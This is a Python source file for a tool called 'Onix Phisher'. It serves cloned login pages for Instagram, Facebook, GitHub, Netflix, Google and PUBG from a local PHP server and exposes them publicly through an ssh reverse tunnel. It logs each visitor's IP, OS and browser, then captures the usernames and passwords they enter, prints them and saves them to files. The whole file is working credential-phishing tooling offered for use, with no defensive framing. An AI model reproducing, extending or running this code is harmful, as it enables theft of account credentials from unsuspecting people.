import subprocess
import json
import sys
import os
import linecache
import random
from time import sleep

if os.name == "nt":
    try:
        from colorama import Fore , init; init()
        import win32gui, win32con
        import pandas as pd
        
    except ImportError or ModuleNotFoundError:
        install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
        if install == "y":
            os.system("pip install -r requirements.txt")
            sleep(0.5)
            pass
        else:
            exit(Fore.GREEN + "\nhave a good day".title())

#For linux====================================================================================================
else:
    try:
        from colorama import Fore , init; init()
        import pandas as pd
        
    except ImportError or ModuleNotFoundError:
        install = input("unfortunately you dont have excepetd modules !!\nWant to install ? (y/n) : ")
        if install == "y":
            os.system("pip install -r requirements_linux.txt")
            sleep(0.5)
            pass
        else:
            exit(Fore.GREEN + "\nhave a good day".title())

#Change Title====================================================================================================
if os.name == "nt":
    os.system("title Onix Phisher")
else:
    pass
#build localhost====================================================================================================
def php_server():
    with open("Server" , "w") as log:
        subprocess.Popen((f"php -S localhost:{port}") , stderr=log , stdout=log , shell=True)
#build host====================================================================================================
def loaclhost():
    global port

    with open("localhost.txt" , "w") as local:
        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
#smooth print====================================================================================================
def Sprint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    sleep(0.1)
#Fullscreen ====================================================================================================
if os.name == "nt":
    getsize = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(getsize , win32con.SW_MAXIMIZE)
else:
    pass
#check php====================================================================================================

check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)

if check != 0:
    print (f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
    sys.exit()


if os.name == "nt":
    os.system("cls")
    pass
else:
    os.system("clear")
    pass
sleep(0.1)


#Banner ====================================================================================================
Banner_color = (Fore.RED , Fore.MAGENTA , Fore.BLUE , Fore.GREEN)


print(fr"""{random.choice(Banner_color)}

    .-'''-.                                                                                                                                       
'   _    \                                                                                                                                     
/   /` '.   \    _..._   .--.                            _________   _...._        .        .--.         .              __.....__              
.   |     \  '  .'     '. |__|                            \        |.'      '-.   .'|        |__|      .'|          .-''         '.            
|   '      |  '.   .-.   ..--.                             \        .'```'.    '.<  |        .--.     <  |         /     .-''"'-.  `. .-,.--.  
\    \     / / |  '   '  ||  | ____     _____               \      |       \     \| |        |  |      | |        /     /________\   \|  .-. | 
`.   ` ..' /  |  |   |  ||  |`.   \  .'    /                |     |        |    || |  .'''-. |  |     _| | .'''-. |                  || |  | | 
    '-...-'`   |  |   |  ||  |  `.  `'    .'                 |      \      /    . | |/.'''. \|  |   .' |  | |/.'''. \\    .-------------'| |  | | 
            |  |   |  ||  |    '.    .'                   |     |\`'-.-'   .'  |  /    | ||  |  .   | /|  /    | | \    '-.____...---.| |  '-  
            |  |   |  ||__|    .'     `.   version : 1.2  |     | '-....-'`    | |     | ||__|.'.'| |//| |     | |  `.             .' | |      
            |  |   |  |      .'  .'`.   `.               .'     '.             | |     | |  .'.'.-'  / | |     | |    `''-...... -'   | |      
            |  |   |  |    .'   /    `.   `.           '-----------'           | '.    | '. .'   \_.'  | '.    | '.                   |_|      
            '--'   '--'   '----'       '----'                                  '---'   '---'           '---'   '---'                           
            
      {Fore.RESET}""")


#choices====================================================================================================
print(f""" 

{Fore.RED}[1]{Fore.LIGHTWHITE_EX} Instagram    {Fore.RED}[2]{Fore.LIGHTWHITE_EX} Facebook    {Fore.RED}[3]{Fore.LIGHTWHITE_EX} Github  

{Fore.RED}[4]{Fore.LIGHTWHITE_EX} Netflix      {Fore.RED}[5]{Fore.LIGHTWHITE_EX} Google      {Fore.RED}[6]{Fore.LIGHTWHITE_EX} Pubg


{Fore.RED}[00]{Fore.LIGHTWHITE_EX} Port Scanner

{Fore.RED}[0]{Fore.LIGHTWHITE_EX} Exit{Fore.RESET}
""")


try:
    ask = input(Fore.MAGENTA + "which option you want: ".title() + Fore.RESET)
except KeyboardInterrupt:
    exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")



#option 0 ====================================================================================================
def zero_exit():
    sys.exit()


#option 1 ====================================================================================================
def instagram():
    global port
    path = os.getcwd()
    os.chdir(rf"{path}/instagram")


#====================================================================================================
    try:
        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):".title() + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
    php_server()
    
    sleep(1)

    loaclhost()

    sleep(8)


#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , ").lstrip())
    linecache.clearcache()

    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:

                
                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
                    break

    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(10)
                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()


#option 2 ====================================================================================================
def facebook():
    global port
    
    path = os.getcwd()
    os.chdir(rf"{path}/facebook")
#====================================================================================================
    try:
        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()

    sleep(8)
#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))

    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    df = pd.read_json(r"info.json")
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
                    
                    break

    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(10)
                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
  
#option 3 ====================================================================================================
def netflix():
    global port

    path = os.getcwd()
    os.chdir(rf"{path}/Netflix")
#====================================================================================================
    try:
        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")


#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()

    sleep(8)
#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))

    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    df = pd.read_json(r"info.json")
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    
                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
    
                    break
    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(9)
                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()


#option 4====================================================================================================
def Google():
    global port
    
    path = os.getcwd()
    os.chdir(rf"{path}/Google")
#====================================================================================================
    try:
        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
    except KeyboardInterrupt:
            exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()

    sleep(8)
#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))

    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    df = pd.read_json(r"info.json")
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()
                    
                
                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
                    
                    break

    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")


#====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\n\n{Fore.GREEN}The User Name is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(9)
                print(f"{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
   
#option 5 ====================================================================================================
def Github():
    global port
    path = os.getcwd()
    os.chdir(rf"{path}/Github")
#====================================================================================================
    try:
        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
    except KeyboardInterrupt:
            exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")


#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()

    sleep(8)

#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))

    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)

#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
                    
                    break

    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")

#====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(10)
                print(f"{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break

    
    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
#option 6 ====================================================================================================
def Pubg():
    global port
    path = os.getcwd()
    os.chdir(rf"{path}/Pubg")
#====================================================================================================
    try:
        port = input(Fore.MAGENTA + "\nwhich port want to open (default 80):" + Fore.RESET)
    except KeyboardInterrupt:
            exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")


#====================================================================================================
    php_server()

    sleep(1)

    loaclhost()

    sleep(8)

#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))

    Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
        
#Write info====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:


                with open("info.json", "r") as read_file:
                    data = json.load(read_file)

                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"])
                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                
                    Sprint(Fore.YELLOW + "\nWaiting for target info...".title() + Fore.RESET)
                    
                    break

    except KeyboardInterrupt:
        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
    
#====================================================================================================
    while True:
        size = os.stat("username_key.txt")
        if size.st_size != 0:
            with open("username_key.txt" , "r") as user:
                sleep(10)
                print(f"\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())

                #clear username.txt file
                username =open('username_key.txt')  
                data = open('data.txt','a')
                for x in username.readlines():
                    data.write(f"\nThe Username is : {x}")
                sleep(1.5)
                open("username_key.txt" , "w").close()

                break

    while True:
        size = os.stat("password_key.txt")
        if size.st_size != 0:
            with open("password_key.txt" , "r") as pas:
                sleep(10)
                print(f"{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)

                #clear password.txt
                pwd =open('password_key.txt')  
                data = open('data.txt','a')
                for x in pwd.readlines():
                    data.write(f"\nThe Password is : {x}")
                    data.write("\n")
                data.close()
                sleep(1.5)
                open("password_key.txt" , "w").close()

                break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo kill php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    
#Run functions ====================================================================================================
if ask == "0":
    zero_exit()

if ask == "00":

    path_app = os.getcwd()
    subprocess.call(f"{path_app}/Port_Scan/Port_Scanner.exe")

if ask == "1":
    instagram()

if ask == "2":
    facebook()

if ask == "3":
    Github()
    
if ask == "4":
    netflix()
    
if ask == "5":
    Google()

if ask == "6":
    Pubg()